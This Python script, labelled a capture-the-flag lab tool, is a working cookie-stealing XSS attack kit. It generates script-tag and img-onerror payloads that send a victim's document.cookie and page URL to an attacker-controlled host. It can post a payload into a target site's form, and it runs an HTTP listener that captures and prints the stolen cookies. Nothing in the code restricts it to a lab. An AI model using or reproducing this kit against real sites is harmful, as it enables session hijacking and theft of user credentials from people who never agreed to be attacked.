#!/usr/bin/env python3
"""Tiny exfil listener for XSS/WAF CTF labs.

Examples:
  python short_listener_hunt.py --host 0.0.0.0 --port 8000 --public-host 10.81.88.211
  python short_listener_hunt.py --public-host 10.81.88.211 --payload-only
"""

from __future__ import annotations

import argparse
import datetime as dt
import http.server
import socketserver
import threading
import urllib.error
import urllib.parse
import urllib.request


def build_payload(public_host: str, port: int) -> str:
	"""Builds a compact payload that sends page + cookie to the attack box."""
	base = f"http://{public_host}:{port}"
	return (
		"<script>"
		f"new Image().src='{base}/collect?c='+encodeURIComponent(document.cookie)"
		"+'&u='+encodeURIComponent(location.href)"
		"+'&t='+Date.now();"
		"</script>"
	)


class ExfilServer(socketserver.ThreadingTCPServer):
	allow_reuse_address = True
	daemon_threads = True

	def __init__(self, server_address: tuple[str, int], handler_class: type[http.server.BaseHTTPRequestHandler]):
		super().__init__(server_address, handler_class)
		self.hit_event = threading.Event()
		self.last_hit: dict[str, str] | None = None


class ExfilHandler(http.server.BaseHTTPRequestHandler):
	server_version = "MiniExfil/1.0"

	def _respond(self, code: int, body: str, content_type: str = "text/plain; charset=utf-8") -> None:
		self.send_response(code)
		self.send_header("Content-Type", content_type)
		self.send_header("Cache-Control", "no-store")
		self.end_headers()
		self.wfile.write(body.encode("utf-8", errors="replace"))

	def _log_hit(self, parsed: urllib.parse.SplitResult) -> None:
		qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
		cookie = qs.get("c", [""])[0]
		url_hit = qs.get("u", [""])[0]
		data = qs.get("d", [""])[0]
		token = qs.get("t", [""])[0]
		all_params = ", ".join(sorted(qs.keys())) if qs else "<none>"
		ua = self.headers.get("User-Agent", "-")
		src = f"{self.client_address[0]}:{self.client_address[1]}"
		ts = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

		server = self.server
		if isinstance(server, ExfilServer):
			server.last_hit = {
				"time": ts,
				"source": src,
				"path": self.path,
				"cookie": cookie,
				"url": url_hit,
				"data": data,
				"token": token,
			}
			server.hit_event.set()

		print("\n" + "=" * 70)
		print(f"[{ts}] Request from {src}")
		print(f"Path: {self.path}")
		print(f"Params: {all_params}")
		print(f"User-Agent: {ua}")
		if url_hit:
			print(f"Victim URL : {url_hit}")
		if cookie:
			print(f"Cookie data: {cookie}")
		else:
			print("Cookie data: <empty or blocked (HttpOnly?)>")
		if data:
			preview = data[:1500]
			print(f"Data preview: {preview}")
		print("=" * 70)

	def do_GET(self) -> None:  # noqa: N802
		parsed = urllib.parse.urlsplit(self.path)
		qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

		if parsed.path == "/health":
			self._respond(200, "ok\n")
			return

		# Accept exfil both on /collect and on /?c=... style callbacks.
		if qs and any(k in qs for k in ("c", "d", "u")):
			self._log_hit(parsed)
			self._respond(200, "collected\n")
			return

		if parsed.path == "/collect":
			self._log_hit(parsed)
			# 1x1 gif would also work; plain text is enough for CTF collection.
			self._respond(200, "collected\n")
			return

		if parsed.path == "/":
			self._respond(200, "listener alive\n")
			return

		self._respond(404, "not found\n")

	def do_POST(self) -> None:  # noqa: N802
		length = int(self.headers.get("Content-Length", "0"))
		_ = self.rfile.read(length) if length else b""
		parsed = urllib.parse.urlsplit(self.path)
		if parsed.path == "/collect":
			self._log_hit(parsed)
			self._respond(200, "collected\n")
			return
		self._respond(404, "not found\n")

	def log_message(self, _format: str, *_args: object) -> None:
		# Keep output focused on exfil data.
		return


def submit_post(post_url: str, author: str, content: str, timeout: float) -> tuple[int, str]:
	body = urllib.parse.urlencode({"author": author, "content": content}).encode("utf-8")
	req = urllib.request.Request(
		post_url,
		data=body,
		method="POST",
		headers={
			"Content-Type": "application/x-www-form-urlencoded",
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Safari/537.36",
		},
	)
	try:
		with urllib.request.urlopen(req, timeout=timeout) as response:
			resp_body = response.read(300).decode("utf-8", errors="replace")
			return response.getcode(), resp_body
	except urllib.error.HTTPError as exc:
		body_preview = exc.read(300).decode("utf-8", errors="replace") if exc.fp else ""
		return exc.code, body_preview


def build_onerror_payload(public_host: str, port: int) -> str:
	# Auto-triggered payload, better than clickable <a href=javascript:...> for bot-only visits.
	return (
		"<img src=x onerror=\"location='http://"
		f"{public_host}:{port}/?c='"
		"+encodeURIComponent(document.cookie)"
		"+'&u='+encodeURIComponent(location.href)"
		"+'&t='+Date.now()\">"
	)


def main() -> int:
	parser = argparse.ArgumentParser(description="Minimal listener for XSS cookie exfil in CTF labs.")
	parser.add_argument("--host", default="0.0.0.0", help="Bind host (default: 0.0.0.0)")
	parser.add_argument("--port", type=int, default=8000, help="Bind port (default: 8000)")
	parser.add_argument(
		"--public-host",
		default="10.81.88.211",
		help="Your VPN-reachable AttackBox IP used in payload output.",
	)
	parser.add_argument(
		"--payload-only",
		action="store_true",
		help="Print payload and exit (no listener start).",
	)
	parser.add_argument("--post-url", help="Target URL that accepts author/content via POST.")
	parser.add_argument("--author", default="ctf-bot", help="Author value for the POST form.")
	parser.add_argument("--content", help="Custom content value. If omitted, default XSS payload is used.")
	parser.add_argument(
		"--wait-seconds",
		type=float,
		default=90.0,
		help="How long to wait for bot callback after posting (default: 90).",
	)
	parser.add_argument(
		"--post-timeout",
		type=float,
		default=12.0,
		help="Timeout for sending initial POST request (default: 12).",
	)
	args = parser.parse_args()

	payload_script = build_payload(args.public_host, args.port)
	payload_onerror = build_onerror_payload(args.public_host, args.port)
	print("Payload (script tag):")
	print(payload_script)
	print("\nPayload (auto-trigger img/onerror):")
	print(payload_onerror)

	if args.payload_only:
		return 0

	with ExfilServer((args.host, args.port), ExfilHandler) as httpd:
		print(f"\nListening on http://{args.host}:{args.port}")
		print("Waiting for bot callbacks on /collect or /?c=...")

		server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
		server_thread.start()

		if args.post_url:
			content = args.content if args.content is not None else payload_onerror
			print(f"\nPOST -> {args.post_url}")
			print(f"Form author={args.author}")
			try:
				status, body_preview = submit_post(args.post_url, args.author, content, args.post_timeout)
				print(f"POST response status: {status}")
				if body_preview.strip():
					print(f"POST response preview: {body_preview[:180]}")
			except urllib.error.URLError as exc:
				print(f"POST failed: {exc.reason}")
				httpd.shutdown()
				httpd.server_close()
				return 2

			print(f"\nWaiting up to {args.wait_seconds:.0f}s for callback...")
			got_hit = httpd.hit_event.wait(timeout=max(args.wait_seconds, 0.0))
			httpd.shutdown()
			httpd.server_close()
			if got_hit and httpd.last_hit:
				hit = httpd.last_hit
				print("\n[+] Callback received")
				print(f"Source: {hit.get('source', '-')}")
				print(f"Path  : {hit.get('path', '-')}")
				if hit.get("cookie"):
					print(f"Cookie: {hit['cookie']}")
				if hit.get("data"):
					print(f"Data  : {hit['data'][:1200]}")
				return 0
			print("\n[-] No callback in time.")
			return 1

		try:
			server_thread.join()
		except KeyboardInterrupt:
			print("\nStopping listener...")
			httpd.shutdown()
			httpd.server_close()
		return 0


if __name__ == "__main__":
	raise SystemExit(main())
